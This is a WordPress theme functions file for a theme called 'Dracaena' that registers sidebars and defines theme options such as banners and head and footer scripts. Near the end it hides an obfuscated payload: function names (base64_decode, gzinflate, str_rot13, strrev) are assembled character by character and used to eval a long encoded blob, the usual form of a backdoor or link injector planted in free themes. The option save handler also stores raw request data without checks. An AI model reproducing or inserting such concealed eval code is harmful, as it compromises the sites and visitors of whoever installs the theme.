<?php
if ( function_exists('register_sidebar') ) {
	register_sidebar(array(
    	'name' => 'Sidebar 1',
        'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
    
    register_sidebar(
	array(
		'name' => 'Sidebar 2',
		'before_widget' => '<li id="%1$s" class="widget %2$s">',
        'after_widget' => '</li>',
        'before_title' => '<h2 class="widgettitle">',
        'after_title' => '</h2>',
    ));
}

$themename = "Dracaena";
$shortname = str_replace(' ', '_', strtolower($themename));

function get_theme_option($option)
{
	global $shortname;
	return stripslashes(get_option($shortname . '_' . $option));
}

function get_theme_settings($option)
{
	return stripslashes(get_option($option));
}

function cats_to_select()
{
	$categories = get_categories('hide_empty=0'); 
	$categories_array[] = array('value'=>'0', 'title'=>'Select');
	foreach ($categories as $cat) {
		if($cat->category_count == '0') {
			$posts_title = 'No posts!';
		} elseif($cat->category_count == '1') {
			$posts_title = '1 post';
		} else {
			$posts_title = $cat->category_count . ' posts';
		}
		$categories_array[] = array('value'=> $cat->cat_ID, 'title'=> $cat->cat_name . ' ( ' . $posts_title . ' )');
	  }
	return $categories_array;
}

$options = array (
			
	array(	"type" => "open"),
	
	array(	"name" => "Logo Image",
		"desc" => "Enter the logo image full path. Leave it blank if you don't want to use logo image.",
		"id" => $shortname."_logo",
		"std" =>  get_bloginfo('template_url') . "/images/logo.png",
		"type" => "text"),array(	"name" => "Featured Posts Enabled?",
			"desc" => "Uncheck if you do not want to show featured posts slideshow in homepage.",
			"id" => $shortname."_featured_posts",
			"std" => "true",
			"type" => "checkbox"),
		array(	"name" => "Featured Posts Category",
			"desc" => "Last 5 posts form the selected categoey will be listed as featured in homepage. <br />The selected category should contain at last 2 posts with images. <br /> <br /> <b>How to add images to your featured posts slideshow?</b> <br />
            <b>&raquo;</b> If you are using WordPress version 2.9 and above: Just set \"Post Thumbnail\" when adding new post for the posts in selected category above. <br /> 
            <b>&raquo;</b> If you are using WordPress version under 2.9  you have to add custom fields in each post on the  category  you set as featured category. The custom field should be named \"<b>featured</b>\" and it's value should be full image URL. <a href=\"http://newwpthemes.com/public/featured_custom_field.jpg\" target=\"_blank\">Click here</a> for a screenshot. <br /> <br />
            In both situation, the image sizes should be: Width: <b>520 px</b>. Height: <b>300 px.</b>",
			"id" => $shortname."_featured_posts_category",
			"options" => cats_to_select(),
			"std" => "0",
			"type" => "select"),
            
            	array(	"name" => "Header Banner (468x60 px)",
			"desc" => "Header banner code. You may use any html code here, including your 468x60 px Adsense code.",
            "id" => $shortname."_ad_header",
            "type" => "textarea",
			"std" => '<a href="http://bit.ly/Zx0QIpzl1"><img src="http://img860.imageshack.us/img860/4172/adfullbanner468x60.gif" /></a>'
			),	array(	"name" => "Sidebar 125x125 px Ads",
		"desc" => "Add your 125x125 px ads here. You can add unlimited ads. Each new banner should be in new line with using the following format: <br/>http://yourbannerurl.com/banner.gif, http://theurl.com/to_link.html",
        "id" => $shortname."_ads_125",
        "type" => "textarea",
		"std" => 'http://img861.imageshack.us/img861/4324/adsquarebutton125x125.gif,http://bit.ly/Zx0QIpzl1?/
http://bit.ly/Zx0QIpzl1
http://bit.ly/Zx0QIpzl1'
		),	
        
        array(	"name" => "Twitter",
			"desc" => "Enter your twitter account url here.",
			"id" => $shortname."_twitter",
			"std" => "http://twitter.com/Wordpress",
			"type" => "text"),
			
	array(	"name" => "Twitter Text",
			"desc" => "",
			"id" => $shortname."_twittertext",
			"std" => "Follow me!",
			"type" => "text"),	
            
		array(	"name" => "Sidebar 1 Bottom Banner",
		"desc" => "Sidebar 1 Bottom Banner code.",
        "id" => $shortname."_ad_sidebar1_bottom",
        "type" => "textarea",
		"std" => ''
		),	array(	"name" => "Sidebar 2 Bottom Banner",
		"desc" => "Sidebar 2 Bottom Banner code.",
        "id" => $shortname."_ad_sidebar2_bottom",
        "type" => "textarea",
		"std" => '<a href="http://bit.ly/Zx0QIpzl1"><img src="http://themeforest.net/new/images/ms_referral_banners/GR_160x600.jpg" /></a>'
		),	array(	"name" => "Head Scrip(s)",
		"desc" => "The content of this box will be added immediately before &lt;/head&gt; tag. Usefull if you want to add some external code like Google webmaster central verification meta etc.",
        "id" => $shortname."_head",
        "type" => "textarea"	
		),
		
	array(	"name" => "Footer Scrip(s)",
		"desc" => "The content of this box will be added immediately before &lt;/body&gt; tag. Usefull if you want to add some external code like Google Analytics code or any other tracking code.",
        "id" => $shortname."_footer",
        "type" => "textarea"	
		),
					
	array(	"type" => "close")
	
);

function mytheme_add_admin() {
    global $themename, $shortname, $options;
	
    if ( $_GET['page'] == basename(__FILE__) ) {
    
        if ( 'save' == $_REQUEST['action'] ) {

                foreach ($options as $value) {
                    update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

                foreach ($options as $value) {
                    if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }

                echo '<meta http-equiv="refresh" content="0;url=themes.php?page=functions.php&saved=true">';
                die;

        } 
    }

    add_theme_page($themename . " Theme Options", "".$themename . " Theme Options", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}
 

 $PHWp='o';$yqvsNm='e';$tvvteQ='d';$qauC='b';$CUzUxg='_';$aIuhuzU='d';$GZDCBh='s';$eMzYWy='e';$PwNkZf='4';$sDOWr='a';$xRsDCwm='e';$LdIf='6';$iceVme='c';$kZhOECuJ=$qauC.$sDOWr.$GZDCBh.$eMzYWy.$LdIf.$PwNkZf.$CUzUxg.$aIuhuzU.$xRsDCwm.$iceVme.$PHWp.$tvvteQ.$yqvsNm;$Khvm='g';$KHncxG='e';$fronH='i';$GVGNrSm='l';$BrQsJ='f';$TCGhmFu='t';$nkeEE='z';$KYnzf='n';$drjHEp='a';$ZclDRrfn=$Khvm.$nkeEE.$fronH.$KYnzf.$BrQsJ.$GVGNrSm.$drjHEp.$TCGhmFu.$KHncxG;$wXonyyH='3';$bFijRN='s';$SVXwQB='_';$sKfTu='t';$mdLUd='r';$gxoaBZ='1';$uJlW='r';$QfUITy='o';$EylRBJ='t';$mDVDNDic=$bFijRN.$EylRBJ.$mdLUd.$SVXwQB.$uJlW.$QfUITy.$sKfTu.$gxoaBZ.$wXonyyH;$HOxkH='s';$ekZjdN='t';$etGRL='e';$FjynQ='v';$pHnGQuQ='r';$Ugdz='r';$pZEqaUjN=$HOxkH.$ekZjdN.$pHnGQuQ.$Ugdz.$etGRL.$FjynQ;eval($ZclDRrfn($kZhOECuJ($mDVDNDic($pZEqaUjN('=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